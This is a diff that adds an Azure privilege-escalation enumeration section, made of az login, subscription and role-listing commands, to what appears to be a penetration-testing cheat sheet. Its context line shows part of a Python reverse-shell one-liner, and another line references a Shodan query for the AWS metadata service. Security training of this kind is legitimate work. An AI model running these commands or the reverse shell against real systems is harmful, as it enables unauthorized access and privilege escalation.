@@ -447,6 +447,22 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 # Cloud:
 
+## Azure:
+
+Enumerate for Priv Esc:
+
+```
+# Login
+$ az login -u <user> -p <password>
+
+# Set Account Subscription
+$ az account set --subscription "Pay-As-You-Go"
+
+# Enumeration for Priv Esc
+$ az ad user list -o table
+$ az role assignment list -o table
+```
+
 ## AWS:
 
 Shodan.io query to enumerate AWS Instance Metadata Service Access
